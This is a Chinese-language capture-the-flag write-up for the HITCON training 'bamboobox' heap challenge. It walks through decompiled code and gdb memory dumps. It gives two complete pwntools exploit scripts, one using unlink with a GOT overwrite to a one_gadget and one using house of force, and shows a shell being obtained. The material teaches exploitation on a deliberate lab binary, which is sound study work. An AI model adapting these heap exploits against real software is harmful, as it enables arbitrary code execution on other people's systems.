# LAB11:bamboobox
https://xz.aliyun.com/news/5361

```
(ctf) root@ca8c26ccc565:~/AutoExpMarkDocker# checksec ./data/unsafe_unlink/hitcon-trainning-lab11-bamboobox
[*] '/root/AutoExpMarkDocker/data/unsafe_unlink/hitcon-trainning-lab11-bamboobox'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No                                                                                                      (ctf) root@ca8c26ccc565:~/AutoExpMarkDocker#
```

开了堆栈不可执行和栈溢出保护，问题不大：

ida分析一波
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _QWORD *v3; // [rsp+8h] [rbp-18h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  v3 = malloc(0x10uLL);
  *v3 = hello_message;
  v3[1] = goodbye_message;
  (*v3)(16LL, 0LL);
  while ( 1 )
  {
    menu();
    read(0, &buf, 8uLL);
    switch ( atoi(&buf) )
    {
      case 1:
        show_item(&buf, &buf);
        break;
      case 2:
        add_item(&buf, &buf);
        break;
      case 3:
        change_item();
        break;
      case 4:
        remove_item();
        break;
      case 5:
        (v3[1])(&buf, &buf);
        exit(0);
        return;
      default:
        puts("invaild choice!!!");
        break;
    }
  }
}
```
熟悉的菜单题：把功能都看一遍
```c
int show_item()
{
  int i; // [rsp+Ch] [rbp-4h]

  if ( !num )
    return puts("No item in the box");
  for ( i = 0; i <= 99; ++i )
  {
    if ( *((_QWORD *)&unk_6020C8 + 2 * i) )
      printf("%d : %s", i, *((const char **)&unk_6020C8 + 2 * i));
  }
  return puts(byte_401089);
}

__int64 add_item()
{
  int i; // [rsp+4h] [rbp-1Ch]
  int v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( num > 99 )
  {
    puts("the box is full");
  }
  else
  {
    printf("Please enter the length of item name:");
    read(0, buf, 8u);
    v2 = atoi(buf);
    if ( !v2 )
    {
      puts("invaild length");
      return 0;
    }
    for ( i = 0; i <= 99; ++i )
    {
      if ( !*((_QWORD *)&unk_6020C8 + 2 * i) )
      {
        *((_DWORD *)&itemlist + 4 * i) = v2;
        *((_QWORD *)&unk_6020C8 + 2 * i) = malloc(v2);
        printf("Please enter the name of item:");
        *(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * i) + (int)read(0, *((void **)&unk_6020C8 + 2 * i), v2)) = 0;
        ++num;
        return 0;
      }
    }
  }
  return 0;
}

unsigned __int64 change_item()
{
  int v1; // [rsp+4h] [rbp-2Ch]
  int v2; // [rsp+8h] [rbp-28h]
  char buf[16]; // [rsp+10h] [rbp-20h] BYREF
  char nptr[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8u);
    v1 = atoi(buf);
    if ( *((_QWORD *)&unk_6020C8 + 2 * v1) )
    {
      printf("Please enter the length of item name:");
      read(0, nptr, 8u);
      v2 = atoi(nptr);
      printf("Please enter the new name of the item:");
      *(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * v1) + (int)read(0, *((void **)&unk_6020C8 + 2 * v1), v2)) = 0;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v5;
}

unsigned __int64 remove_item()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8u);
    v1 = atoi(buf);
    if ( *((_QWORD *)&unk_6020C8 + 2 * v1) )
    {
      free(*((void **)&unk_6020C8 + 2 * v1));
      *((_QWORD *)&unk_6020C8 + 2 * v1) = 0;
      *((_DWORD *)&itemlist + 4 * v1) = 0;
      puts("remove successful!!");
      --num;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v3;
}
```
接着我们把函数提取出来：
```python
def malloc(size,content):
    ru("Your choice:")
    sl('2')
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the name of item:")
    sd(content)
def free(index):
    ru("Your choice:")
    sl('4')
    ru("Please enter the index of item:")
    sl(str(index))
def exit():
    ru("Your choice:")
    sl('5')
def puts():
    ru("Your choice:")
    sl('1')
def change(index,size,content):
    ru("Your choice:")
    sl('3')
    ru("Please enter the index of item:")
    sd(str(index))
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the new name of the item:")
    sd(content)
```

认真分析会发现chunk块的结构如下:
```c
struct chunk{
int size；
char a[size];
}
```
进一步分析可以知道，存在堆溢出的漏洞，造成堆块的重叠，这里就是说change时会把新的内容输进去，从而覆盖原来的内容达到溢出的目的，但是一开始题目会生成一个chunk（0x10），我们知道这是用于输出最开始和结束的字符串，有地址，程序有magic地址：
``` 
- `_init_proc`
- `sub_4006C0`
- `_puts`
- `_free`
- `_malloc`
- `_setvbuf`
- `_open`
- `_atoi`
- `_exit`
- `_start`
- `_dl_fini`
- `_register_tm_clones`
- `_frame_dummy`
- `_magic` （被红色圆圈标记）
- `___do_global_dtors_aux`
- `_frame_dummy_init`
- `_libc_csu_fini`
- `_libc_csu_init`
- `_fini`
- `_printf`
- `_fread`
- `_strlen`
- `_strcmp`
- `_write`
- `_read`
- `_setvbuf`
- `_malloc`
- `_exit`
- `_open`
- `_atoi`
- `_exit`
这些是 IDA Pro 中显示的函数名称。其中 `_magic` 被特别标记出来，可能是当前关注的重点函数。
```


这题的思路就是unlink，因为有堆溢出的漏洞，所以可以改写相邻的chunk的状态，使得它在free时会触发unlink，实现我们的攻击目的：

利用思路：在chunk1中构造fake_chunk，然后溢出改chunk2的presize和size，这样就可以free掉chunk1了，同时可以触发unlink，使得我们的ptr指针指向ptr-3的位置，输入时输入‘a’*24+atoi_got，就可以实现ptr指向got表，接着可打印出真实地址，又可以改写got为onagadget。

上exp:
```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')

local = 1
elf = ELF('./bamboobox')
if local:
    p = process('./bamboobox')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('./libc.so.6')

sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()


def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

def malloc(size,content):
    ru("Your choice:")
    sl('2')
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the name of item:")
    sd(content)
def free(index):
    ru("Your choice:")
    sl('4')
    ru("Please enter the index of item:")
    sl(str(index))
def exit():
    ru("Your choice:")
    sl('5')
def puts():
    ru("Your choice:")
    sl('1')
def change(index,size,content):
    ru("Your choice:")
    sl('3')
    ru("Please enter the index of item:")
    sd(str(index))
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the new name of the item:")
    sd(content)

magic = 0x400d49
atoi_got = elf.got["atoi"]

#bk(0x0000000000400ADD)
malloc(0x80,'aaaa')
malloc(0x80,'bbbb')

FD = 0x6020c8 - 3*8
BK = FD + 8
py1 = p64(0) + p64(0x81) + p64(FD) + p64(BK)  #0x20
py1 += "a"*0x60 
py1 += p64(0x80) + p64(0x90) #0x10
change(0,0x90,py1)
free(1)

py2 = ''
py2 += 'a'*24 + p64(atoi_got)
change(0,len(py2),py2) 
puts()

atoi_addr = u64(ru('\x7f')[-6:].ljust(8,'\x00'))
print "atoi_addr--->" + hex(atoi_addr)
onegadget = atoi_addr - libc.symbols["atoi"] + 0xf02a4
print "onegadget--->" + hex(onegadget)
change(0,0x10,p64(onegadget))
exit()

p.interactive()
```
下面进入gdb动态调试一波，看下具体是怎么实现的：

首先是malloc两个0x80大小的块（实际会是0x90，超过了fastbin的范围），就可以实现unlink，双向链表才有这个操作，fastbin单向链表所以是没有的unlink的攻击的。

```
pwndbg> parseheap
addr       prev       size       status     fd         bk         
0xf4d000   0x0        0x20       Used       None       None       
0xf4d020   0x0        0x90       Used       None       None       
0xf4d0b0   0x0        0x90       Used       None       None       

pwndbg> hex 0xf4d000 300
+0x000 0xf4d000 00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │....│....│!...│....│
+0x010 0xf4d010 96 08 40 00  00 00 00 00  b1 08 40 00  00 00 00 00  │..@.│....│..@.│....│
+0x020 0xf4d020 00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │....│....│....│....│
+0x030 0xf4d030 61 61 61 61  00 00 00 00  00 00 00 00  00 00 00 00  │aaaa│....│....│....│
+0x040 0xf4d040 00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│
...
+0x0b0 0xf4d0b0 00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │....│....│....│....│
+0x0c0 0xf4d0c0 62 62 62 62  00 00 00 00  00 00 00 00  00 00 00 00  │bbbb│....│....│....│
+0x0d0 0xf4d0d0 00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│
...
+0x120 0xf4d120 00 00 00 00  00 00 00 00  00 00 00 00               │....│....│....│    │

pwndbg> 
```

可以看到3个chunk，1号chunk是存字符串的，2和3号chunk是我们申请的chunk块。

接着我们构造出fake_chunk:

```
pwndbg> parseheap
addr       prev       size       status     fd         bk         
0xf4d000   0x0        0x20       Used       None       None       
0xf4d020   0x0        0x90       Freed      None       0x81       
0xf4d0b0   0x0        0x90       Used       None       None       

pwndbg> hex 0xf4d000 300
+0x000 0xf4d000 00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │....│....│!...│....│
+0x010 0xf4d010 96 08 40 00  00 00 00 00  b1 08 40 00  00 00 00 00  │..@.│....│..@.│....│
+0x020 0xf4d020 00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │....│....│....│....│
+0x030 0xf4d030 00 00 00 00  00 00 00 00  81 00 00 00  00 00 00 00  │....│....│....│....│
+0x040 0xf4d040 b0 20 60 00  00 00 00 00  b8 20 60 00  00 00 00 00  │..`.│....│..`.│....│
+0x050 0xf4d050 61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
...
+0x0b0 0xf4d0b0 80 00 00 00  00 00 00 00  90 00 00 00  00 00 00 00  │....│....│....│....│
+0x0c0 0xf4d0c0 00 62 62 62  00 00 00 00  00 00 00 00  00 00 00 00  │.bbb│....│....│....│
+0x0d0 0xf4d0d0 00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│
...
+0x120 0xf4d120 00 00 00 00  00 00 00 00  00 00 00 00               │....│....│....│    │
```

在free掉chunk3前，我们先看看我们的ptr = 0x6020c8在内存中的布局：

```
pwndbg> x/40gx 0x6020c8-24
0x6020b0 <stdin@@GLIBC_2.2.5>:   0x00007f029b4f78e0      0x0000000000000080
0x6020c0 <itemList>:           0x0000000000000080      0x0000000000f4d030
0x6020d0 <itemList+16>:        0x0000000000000080      0x0000000000f4d0c0
0x6020e0 <itemList+32>:        0x0000000000000000      0x0000000000000000
0x6020f0 <itemList+48>:        0x0000000000000000      0x0000000000000000
0x602100 <itemList+64>:        0x0000000000000000      0x0000000000000000
0x602110 <itemList+80>:        0x0000000000000000      0x0000000000000000
0x602120 <itemList+96>:        0x0000000000000000      0x0000000000000000
0x602130 <itemList+112>:       0x0000000000000000      0x0000000000000000
0x602140 <itemList+128>:       0x0000000000000000      0x0000000000000000
0x602150 <itemList+144>:       0x0000000000000000      0x0000000000000000
0x602160 <itemList+160>:       0x0000000000000000      0x0000000000000000
0x602170 <itemList+176>:       0x0000000000000000      0x0000000000000000
0x602180 <itemList+192>:       0x0000000000000000      0x0000000000000000
0x602190 <itemList+208>:       0x0000000000000000      0x0000000000000000
0x6021a0 <itemList+224>:       0x0000000000000000      0x0000000000000000
0x6021b0 <itemList+240>:       0x0000000000000000      0x0000000000000000
0x6021c0 <itemList+256>:       0x0000000000000000      0x0000000000000000
0x6021d0 <itemList+272>:       0x0000000000000000      0x0000000000000000
0x6021e0 <itemList+288>:       0x0000000000000000      0x0000000000000000
pwndbg> 
```

看到它指向的正是0xf4d030，也就是我们的chunk2的string的堆块地址，接着我们free掉chunk3，可以得到：

```
pwndbg> x/40gx 0x6020c8-24
0x6020b0 <stdin@@GLIBC_2.2.5>:   0x00007f029b4f78e0      0x0000000000000080
0x6020c0 <itemList>:           0x0000000000000080      0x00000000006020b0
0x6020d0 <itemList+16>:        0x0000000000000000      0x0000000000000000
0x6020e0 <itemList+32>:        0x0000000000000000      0x0000000000000000
0x6020f0 <itemList+48>:        0x0000000000000000      0x0000000000000000
0x602100 <itemList+64>:        0x0000000000000000      0x0000000000000000
0x602110 <itemList+80>:        0x0000000000000000      0x0000000000000000
0x602120 <itemList+96>:        0x0000000000000000      0x0000000000000000
0x602130 <itemList+112>:       0x0000000000000000      0x0000000000000000
0x602140 <itemList+128>:       0x0000000000000000      0x0000000000000000
0x602150 <itemList+144>:       0x0000000000000000      0x0000000000000000
0x602160 <itemList+160>:       0x0000000000000000      0x0000000000000000
0x602170 <itemList+176>:       0x0000000000000000      0x0000000000000000
0x602180 <itemList+192>:       0x0000000000000000      0x0000000000000000
0x602190 <itemList+208>:       0x0000000000000000      0x0000000000000000
0x6021a0 <itemList+224>:       0x0000000000000000      0x0000000000000000
0x6021b0 <itemList+240>:       0x0000000000000000      0x0000000000000000
0x6021c0 <itemList+256>:       0x0000000000000000      0x0000000000000000
0x6021d0 <itemList+272>:       0x0000000000000000      0x0000000000000000
0x6021e0 <itemList+288>:       0x0000000000000000      0x0000000000000000
pwndbg> 
```

ptr指向我们的ptr-24的位置（0x6020b0），接着看下我们的堆块

```
pwndbg> hex 0xf4d000 300
+0x000 0xf4d000 00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │....│....│!...│....│
+0x010 0xf4d010 96 08 40 00  00 00 00 00  b1 08 40 00  00 00 00 00  │..@.│....│..@.│....│
+0x020 0xf4d020 00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │....│....│....│....│
+0x030 0xf4d030 00 00 00 00  00 00 00 00  d1 0f 02 00  00 00 00 00  │....│....│....│....│
+0x040 0xf4d040 b0 20 60 00  00 00 00 00  b8 20 60 00  00 00 00 00  │..`.│....│..`.│....│
+0x050 0xf4d050 61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
...
+0x0b0 0xf4d0b0 80 00 00 00  00 00 00 00  90 00 00 00  00 00 00 00  │....│....│....│....│
+0x0c0 0xf4d0c0 00 62 62 62  00 00 00 00  00 00 00 00  00 00 00 00  │.bbb│....│....│....│
+0x0d0 0xf4d0d0 00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│
...
+0x120 0xf4d120 00 00 00 00  00 00 00 00  00 00 00 00               │....│....│....│    │
```

可以看到由于只有一个free块又与topchunk相邻，所以会和topchunk结合。大小变成0x20fd1，如果申请了3个chunk就会放到unsorted bin 中。

接着我们改写0x6020c8的位置为atoi的got表：

```
pwndbg> x/40gx 0x6020c8-24
0x6020b0 <stdin@@GLIBC_2.2.5>:   0x6161616161616161      0x6161616161616161
0x6020c0 <itemList>:           0x6161616161616161      0x0000000000602068
0x6020d0 <itemList+16>:        0x0000000000000000      0x0000000000000000
0x6020e0 <itemList+32>:        0x0000000000000000      0x0000000000000000
0x6020f0 <itemList+48>:        0x0000000000000000      0x0000000000000000
0x602100 <itemList+64>:        0x0000000000000000      0x0000000000000000
0x602110 <itemList+80>:        0x0000000000000000      0x0000000000000000
0x602120 <itemList+96>:        0x0000000000000000      0x0000000000000000
0x602130 <itemList+112>:       0x0000000000000000      0x0000000000000000
0x602140 <itemList+128>:       0x0000000000000000      0x0000000000000000
0x602150 <itemList+144>:       0x0000000000000000      0x0000000000000000
0x602160 <itemList+160>:       0x0000000000000000      0x0000000000000000
0x602170 <itemList+176>:       0x0000000000000000      0x0000000000000000
0x602180 <itemList+192>:       0x0000000000000000      0x0000000000000000
0x602190 <itemList+208>:       0x0000000000000000      0x0000000000000000
0x6021a0 <itemList+224>:       0x0000000000000000      0x0000000000000000
0x6021b0 <itemList+240>:       0x0000000000000000      0x0000000000000000
0x6021c0 <itemList+256>:       0x0000000000000000      0x0000000000000000
0x6021d0 <itemList+272>:       0x0000000000000000      0x0000000000000000
0x6021e0 <itemList+288>:       0x0000000000000000      0x0000000000000000
pwndbg> 
```

这里前面有3个位置直接填充字符，看到0x6020c8的位置被我们成功写成了atoi的got表，接着再写一次就是往got写onegadget了：

```
pwndbg> tele 0x602068
00:0000│   0x602068 (_GLOBAL_OFFSET_TABLE_+104) —▸ 0x7cee6e2b63a4 (exec_comm.constprop+1140) ◂— mov    rax, qword ptr [rip + 0x2d3b0d] 
01:0008│   0x602070 (_GLOBAL_OFFSET_TABLE_+112) —▸ 0x400700 (printf@plt) ◂— jmp    qword ptr [rip + 0x20192a]
02:0010│   0x602078 (data_start) ◂— 0x0
... ↓
07:0038│   0x6020a0 (stdout@@GLIBC_2.2.5) —▸ 0x7cee6e58b620 (_IO_2_1_stdout_) ◂— 0xfbad2887
```

可以看到成功写入了onegadget，当再次选择时，调用atoi函数就是调用了onegadget，那么就可以gethell了~

```
victor@ubuntu:~/Desktop/Review/HITCON-training-master/LAB/lab1$ 
'Bamboobox Menu\n'
'-----------------------------\n'
'1.show the items in the box\n'
'2.add a new item\n'
'3.change the item in the box\n'
'4.remove the item in the box\n'
'5.exit\n'
'-----------------------------\n'
'Your choice:'
[DEBUG] Sent 0x2 bytes:
'5\n'
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
'ls\n'
[DEBUG] Received 0x5b bytes:
'666.py\tbamboobox1.py bamboobox.c core\n'
'bamboobox bamboobox2.py bam.py Makefile\n'
666.py  bamboobox1.py  bamboobox.c  core
bamboobox  bamboobox2.py  bam.py  Makefile
$
```

这题如果不用unlink去做，就是用house of force，也就是一开始我想的，怎么修改程序自己生成的那个chunk，因为里面有地址，想要修改地址里面的内容为我们的magic，这样就可以实现catflag了，直接上exp:
```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')

local = 1
elf = ELF('./bamboobox')
if local:
    p = process('./bamboobox')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('./libc.so.6')

sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()


def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

def malloc(size,content):
    ru("Your choice:")
    sl('2')
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the name of item:")
    sd(content)
def free(index):
    ru("Your choice:")
    sl('4')
    ru("Please enter the index of item:")
    sl(str(index))
def exit():
    ru("Your choice:")
    sl('5')
def puts():
    ru("Your choice:")
    sl('1')
def change(index,size,content):
    ru("Your choice:")
    sl('3')
    ru("Please enter the index of item:")
    sd(str(index))
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the new name of the item:")
    sd(content)

magic = 0x400d49

bk(0x0000000000400ADD)
malloc(0x60,'aaaa')
py1 = 'a'*0x60 + p64(0) + p64(0xffffffffffffffff)
change(0,0x70,py1)
malloc(-160,'bbbb')
malloc(0x20, p64(magic)*2)
p.interactive()
```
那么问题来了，如果没有这个堆溢出漏洞可以去构造出fake_chunk时，或者说malloc的大小固定时我们应该怎么办呢？这里介绍第二种方式：堆块的错位重叠（同样也是堆块里面创造堆块），这里要用到堆地址才能实现，所以得有puts函数打印出堆块上面的信息。